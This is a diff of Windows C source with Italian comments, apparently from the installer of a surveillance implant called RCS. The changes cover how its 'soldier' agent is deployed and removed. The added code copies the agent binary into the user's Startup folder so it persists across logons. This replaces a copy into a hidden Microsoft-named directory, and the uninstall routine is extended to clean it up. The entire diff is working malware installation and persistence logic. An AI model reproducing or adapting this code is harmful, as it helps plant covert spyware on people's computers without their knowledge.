@@ -12,33 +12,9 @@ BOOL WIN_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 
 	// Se puo' installare solo il soldier
 	if (os_info->is_blacklisted == BL_ALLOWSOLDIER) {
-		// Copia il file 
-		swprintf_s(tmp_path, MAX_PATH, L"%s\\WINDOWS\\SOLDIER\\*.*", rcs_info->rcs_files_path);
-		hFind = FindFirstFile(tmp_path, &file_info);
-		if (hFind != INVALID_HANDLE_VALUE) {
-			do {
-				// Salta le directory (es: ".", ".." etc...)
-				if (file_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-					continue;
-
-				swprintf_s(tmp_path, MAX_PATH, L"%s\\WINDOWS\\SOLDIER\\%s", rcs_info->rcs_files_path, file_info.cFileName);
-				swprintf_s(tmp_path2, MAX_PATH, L"%s%s\\Microsoft\\%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir, file_info.cFileName);
-				ClearAttributes(tmp_path2);
-				if (!CopyFile(tmp_path, tmp_path2, FALSE)) {
-					FindClose(hFind);
-					return FALSE;
-				}
-				SetFileAttributes(tmp_path2, FILE_ATTRIBUTE_NORMAL);
-			} while (FindNextFile(hFind, &file_info));
-			if (GetLastError() != ERROR_NO_MORE_FILES) {
-				FindClose(hFind);
-				return FALSE;
-			}
-			FindClose(hFind);
-		} else
-			return FALSE;
-
-		return TRUE;
+		swprintf_s(tmp_path, MAX_PATH, L"%s\\WINDOWS\\SOLDIER\\%s", rcs_info->rcs_files_path, rcs_info->soldier_name);
+		swprintf_s(tmp_path2, MAX_PATH, L"%s\\%s", user_info->user_startup, rcs_info->soldier_name);
+		return CopyFile(tmp_path, tmp_path2, FALSE);
 	}
 
 	// Continua se deve installare l'elite...
@@ -140,6 +116,11 @@ BOOL WIN_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_stru
 		if (!RemoveDirectory(tmp_path))
 			ret_val = FALSE;
 	}
+
+	// Cancella un eventuale Soldier
+	swprintf_s(tmp_path, MAX_PATH, L"%s\\%s", user_info->user_startup, rcs_info->soldier_name);
+	ClearAttributes(tmp_path);
+	DeleteFile(tmp_path);
 
 	// Cancella la chiave nel registry
 	swprintf_s(tmp_path, sizeof(tmp_path)/sizeof(tmp_path[0]), L"%s%s", user_info->user_home, L"\\ntuser.dat");
